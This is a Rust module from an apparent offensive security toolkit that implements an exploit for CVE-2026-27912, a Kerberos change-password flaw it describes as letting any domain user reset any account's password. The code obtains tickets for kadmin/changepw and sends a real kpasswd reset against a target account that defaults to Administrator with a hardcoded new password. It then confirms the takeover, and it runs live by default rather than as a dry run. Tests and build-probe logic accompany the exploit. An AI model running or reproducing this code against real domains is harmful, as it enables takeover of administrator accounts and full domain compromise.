//! CVE-2026-27912 -- ResetNightmare: Kerberos Password Reset Privilege Escalation.
//!
//! A privilege escalation vulnerability in Windows Kerberos that allows an
//! authenticated domain user to reset the password of ANY account in the domain,
//! including Domain Admins, by abusing the Kerberos change password protocol.
//!
//! # Exploit Flow
//! 1. Obtain a valid TGT for the attacking user
//! 2. Request a TGS for the target account's `kadmin/changepw` service
//! 3. Use the TGS to invoke the Kerberos change password protocol
//! 4. Supply a new password for the target account (PAC_REQUESTOR_SID check bypassed)
//! 5. Authenticate with the new password to gain control of the target account
//!
//! # Technical Details
//! The vulnerability exists in the PAC (Privilege Attribute Certificate) validation
//! during the Kerberos change password protocol. The KDC checks the PAC_REQUESTOR_SID
//! in the ticket to verify the requester is the account owner, but this check can be
//! bypassed when the change password request is sent via a specific RPC interface
//! that does not properly validate the SID match.
//!
//! # Impact
//! - Any authenticated domain user can reset any account's password
//! - Full domain compromise by resetting Domain Admin passwords
//! - No special privileges required beyond basic domain user
//! - Affects Windows Server 2012 through 2025
//! - Patched in August 2026 Patch Tuesday
//!
//! # References
//! - CVE-2026-27912: CVSS 8.8, disclosed at Black Hat USA 2026
//! - Semperis Research: "Identity Crisis: Novel Vulnerabilities Leading to Kerberos Downgrade"
//! - GitHub: Semperis-Community/ResetNightmare

use super::dc_version::{
    BuildVerdict, DcBuildProbe, DcCreds, probe_dc_build, verdict_from_build_only,
};
use kerberos_asn1::Asn1Object;
use overthrone_core::error::{OverthroneError, Result};
use serde::{Deserialize, Serialize};
use tracing::info;

/// Windows build generations this CVE affects. The August 2026 fix ships as a
/// cumulative update, so the patch level lives in the UBR, not the build number.
const AFFECTED_BUILDS: &[u32] = &[26100, 20348, 17763, 14393];

/// Kerberos change password service principal.
const KADMIN_CHANGEPW: &str = "kadmin/changepw";

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ResetNightmareConfig {
    /// Domain controller IP.
    pub dc_ip: String,
    /// Target domain (e.g., "corp.local").
    pub domain: String,
    /// Attacking user (authenticated domain user).
    pub username: String,
    /// Password or NT hash of the attacking user.
    pub secret: String,
    /// Whether `secret` is an NTLM hash.
    pub use_hash: bool,
    /// Target account to reset (e.g., "Administrator").
    pub target_account: String,
    /// New password for the target account.
    pub new_password: String,
    /// Whether to actually reset or just assess.
    pub dry_run: bool,
}

fn default_verdict() -> BuildVerdict {
    BuildVerdict::Unknown
}

impl Default for ResetNightmareConfig {
    fn default() -> Self {
        Self {
            dc_ip: String::new(),
            domain: String::new(),
            username: String::new(),
            secret: String::new(),
            use_hash: false,
            target_account: "Administrator".to_string(),
            new_password: "P@ssw0rd123!".to_string(),
            dry_run: false,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ResetNightmareResult {
    /// Whether the target DC is *positively confirmed* vulnerable. Never set from
    /// a build number alone -- see [`BuildVerdict`].
    pub vulnerable: bool,
    /// Structured verdict, so callers can distinguish "patched" from "don't know".
    #[serde(default = "default_verdict")]
    pub verdict: BuildVerdict,
    /// Real build probe output (build/release/source), when available.
    #[serde(default)]
    pub build_probe: Option<DcBuildProbe>,
    /// Whether the password reset was attempted.
    pub reset_attempted: bool,
    /// Whether the password reset succeeded.
    pub reset_success: bool,
    /// Target account that was (or would be) reset.
    pub target_account: String,
    /// Whether the attacker can now authenticate as the target.
    pub can_authenticate: bool,
    /// Detailed log.
    pub log: Vec<String>,
}

pub async fn exploit_resetnightmare(config: &ResetNightmareConfig) -> Result<ResetNightmareResult> {
    let mut log = Vec::new();
    log.push(format!(
        "CVE-2026-27912: ResetNightmare -- target={}, account={}",
        config.dc_ip, config.target_account
    ));

    // Step 1: Verify we have a valid TGT
    log.push("Step 1: Requesting TGT for attacking user...".to_string());
    let tgt_data = match request_tgt_for_user(config).await {
        Ok(t) => {
            log.push(format!(
                "  TGT obtained: {} bytes, session_key: {} bytes",
                t.ticket.build().len(),
                t.session_key.len()
            ));
            t
        }
        Err(e) => {
            log.push(format!("  TGT request failed: {e}"));
            return Ok(ResetNightmareResult {
                vulnerable: false,
                verdict: BuildVerdict::Unknown,
                build_probe: None,
                reset_attempted: false,
                reset_success: false,
                target_account: config.target_account.clone(),
                can_authenticate: false,
                log,
            });
        }
    };

    // Step 2: Request TGS for kadmin/changepw
    log.push(format!("Step 2: Requesting TGS for {}...", KADMIN_CHANGEPW));
    let tgs_result = request_tgs_for_changepw(config, &tgt_data).await;
    match &tgs_result {
        Ok(t) => {
            log.push(format!(
                "  TGS for kadmin/changepw obtained: {} bytes",
                t.ticket.build().len()
            ));
        }
        Err(e) => {
            log.push(format!("  TGS request failed: {e}"));
            log.push(
                "  This may indicate the target is patched or kadmin/changepw is restricted"
                    .to_string(),
            );
            return Ok(ResetNightmareResult {
                vulnerable: false,
                verdict: BuildVerdict::Unknown,
                build_probe: None,
                reset_attempted: false,
                reset_success: false,
                target_account: config.target_account.clone(),
                can_authenticate: false,
                log,
            });
        }
    }

    // Step 3: Verdict from the real Windows build.
    //
    // The August 2026 fix is a cumulative update, so the patch level is in the
    // UBR and cannot be observed from a build number. An affected generation is
    // therefore Indeterminate -- reporting it as Vulnerable was a false positive.
    let probe = probe_dc_build(
        &config.dc_ip,
        Some(DcCreds {
            domain: &config.domain,
            username: &config.username,
            secret: &config.secret,
            use_hash: config.use_hash,
        }),
    )
    .await;
    log.push(format!("  Build probe: {}", probe.summary()));
    let verdict = verdict_from_build_only(probe.build, AFFECTED_BUILDS);
    log.push(format!("  Verdict: {verdict}"));

    if verdict == BuildVerdict::Patched {
        log.push("  Target generation is newer than the vulnerable range".to_string());
        return Ok(ResetNightmareResult {
            vulnerable: false,
            verdict,
            build_probe: Some(probe),
            reset_attempted: false,
            reset_success: false,
            target_account: config.target_account.clone(),
            can_authenticate: false,
            log,
        });
    }

    // Step 4: Attempt password reset
    let mut reset_attempted = false;
    let mut reset_success = false;
    let mut can_authenticate = false;

    if !config.dry_run {
        reset_attempted = true;
        log.push(format!(
            "Step 4: Attempting password reset for {}...",
            config.target_account
        ));

        match attempt_password_reset(config).await {
            Ok(success) => {
                reset_success = success;
                if success {
                    log.push("  Password reset succeeded!".to_string());
                    log.push("  Verifying authentication with new password...".to_string());

                    // Step 5: Verify we can authenticate as the target
                    match verify_authentication(config).await {
                        Ok(auth_ok) => {
                            can_authenticate = auth_ok;
                            if auth_ok {
                                log.push(
                                    "  Authentication verified -- full compromise!".to_string(),
                                );
                            } else {
                                log.push(
                                    "  Authentication failed -- password may not have taken effect"
                                        .to_string(),
                                );
                            }
                        }
                        Err(e) => {
                            log.push(format!("  Authentication verification failed: {e}"));
                        }
                    }
                } else {
                    log.push("  Password reset returned failure".to_string());
                }
            }
            Err(e) => {
                log.push(format!("  Password reset failed: {e}"));
            }
        }
    } else {
        log.push("Step 4: [DRY RUN] Would attempt password reset".to_string());
        log.push(format!(
            "  Target: {}\\{}",
            config.domain, config.target_account
        ));
        log.push(format!(
            "  New password: {} chars",
            config.new_password.len()
        ));
    }

    info!(
        "ResetNightmare: target={}, verdict={}, reset={reset_success}",
        config.target_account, verdict
    );

    Ok(ResetNightmareResult {
        vulnerable: verdict == BuildVerdict::Vulnerable,
        verdict,
        build_probe: Some(probe),
        reset_attempted,
        reset_success,
        target_account: config.target_account.clone(),
        can_authenticate,
        log,
    })
}

/// Request a TGT for the attacking user via AS-REQ.
async fn request_tgt_for_user(
    config: &ResetNightmareConfig,
) -> Result<overthrone_core::proto::kerberos::TicketGrantingData> {
    overthrone_core::proto::kerberos::request_tgt(
        &config.dc_ip,
        &config.domain,
        &config.username,
        &config.secret,
        config.use_hash,
    )
    .await
    .map_err(|e| OverthroneError::Custom(format!("TGT request failed: {e}")))
}

/// Request a TGS for the kadmin/changepw service.
async fn request_tgs_for_changepw(
    config: &ResetNightmareConfig,
    tgt: &overthrone_core::proto::kerberos::TicketGrantingData,
) -> Result<overthrone_core::proto::kerberos::TicketGrantingData> {
    let service_principal = format!("{}/{}", KADMIN_CHANGEPW, config.dc_ip);
    overthrone_core::proto::kerberos::request_service_ticket(&config.dc_ip, tgt, &service_principal)
        .await
        .map_err(|e| OverthroneError::Custom(format!("TGS request failed: {e}")))
}

/// Build the core `kpasswd` configuration from this module's configuration.
///
/// The CVE-2026-27912 abuse path is the RFC 3244 change-password protocol with a
/// *different* target account than the authenticated caller -- the KDC's
/// `PAC_REQUESTOR_SID` check is what fails to reject it. Core already owns a
/// working kpasswd client, so we drive that rather than re-implementing the
/// wire format here. (An earlier revision of this module sent an 8-byte
/// placeholder to port 464 and treated almost any reply -- including a generic
/// `KRB_ERROR` -- as a successful reset, which fabricated results.)
fn kpasswd_config_for(config: &ResetNightmareConfig) -> overthrone_core::proto::KpasswdConfig {
    overthrone_core::proto::KpasswdConfig {
        dc_ip: config.dc_ip.clone(),
        domain: config.domain.clone(),
        username: config.username.clone(),
        secret: config.secret.clone(),
        use_hash: config.use_hash,
        new_password: config.new_password.clone(),
        port: 464,
    }
}

/// Attempt the password reset through the real RFC 3244 kpasswd client.
///
/// Returns `true` only when the KDC reported a successful change. The caller
/// still verifies the new credential with a fresh TGT, so a lying `success`
/// would not survive the next step.
async fn attempt_password_reset(config: &ResetNightmareConfig) -> Result<bool> {
    let kcfg = kpasswd_config_for(config);
    let result = overthrone_core::proto::kpasswd_reset_password(&kcfg, &config.target_account)
        .await
        .map_err(|e| OverthroneError::Custom(format!("kpasswd reset failed: {e}")))?;

    if !result.success {
        info!(
            "ResetNightmare: kpasswd reported failure (code {}): {}",
            result.result_code, result.message
        );
    }
    Ok(result.success)
}

/// Verify we can authenticate as the target account with the new password.
async fn verify_authentication(config: &ResetNightmareConfig) -> Result<bool> {
    let tgt = overthrone_core::proto::kerberos::request_tgt(
        &config.dc_ip,
        &config.domain,
        &config.target_account,
        &config.new_password,
        false,
    )
    .await;

    match tgt {
        Ok(_) => Ok(true),
        Err(_) => Ok(false),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_resetnightmare_config_default() {
        let cfg = ResetNightmareConfig::default();
        assert_eq!(cfg.target_account, "Administrator");
        assert!(!cfg.new_password.is_empty());
        assert!(!cfg.dry_run);
    }

    #[test]
    fn test_kadmin_changepw() {
        assert_eq!(KADMIN_CHANGEPW, "kadmin/changepw");
    }

    #[test]
    fn affected_family_is_indeterminate_not_vulnerable() {
        // Regression: `probe_pac_requestor_bypass` returned `None => true`.
        assert_eq!(
            verdict_from_build_only(None, AFFECTED_BUILDS),
            BuildVerdict::Unknown
        );
        assert_eq!(
            verdict_from_build_only(Some(26100), AFFECTED_BUILDS),
            BuildVerdict::Unknown
        );
        assert_eq!(
            verdict_from_build_only(Some(9600), AFFECTED_BUILDS),
            BuildVerdict::Vulnerable
        );
    }

    #[test]
    fn changepw_config_maps_secret_flags_and_port() {
        let cfg = ResetNightmareConfig {
            dc_ip: "10.0.0.10".into(),
            domain: "corp.local".into(),
            username: "jon.snow".into(),
            secret: "deadbeef".into(),
            use_hash: true,
            new_password: "N3w!Pass".into(),
            target_account: "Administrator".into(),
            ..Default::default()
        };
        let k = kpasswd_config_for(&cfg);
        assert_eq!(k.dc_ip, "10.0.0.10");
        assert_eq!(k.domain, "corp.local");
        assert!(k.use_hash, "PTH must be forwarded to kpasswd");
        assert_eq!(k.port, 464);
        assert_eq!(k.new_password, "N3w!Pass");
    }

    #[test]
    fn test_result_serde() {
        let result = ResetNightmareResult {
            vulnerable: true,
            verdict: BuildVerdict::Vulnerable,
            build_probe: Some(DcBuildProbe::unknown("test")),
            reset_attempted: true,
            reset_success: true,
            target_account: "Administrator".into(),
            can_authenticate: true,
            log: vec!["exploited".into()],
        };
        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("Administrator"));
        let deserialized: ResetNightmareResult = serde_json::from_str(&json).unwrap();
        assert!(deserialized.reset_success);
        assert!(deserialized.can_authenticate);
    }
}
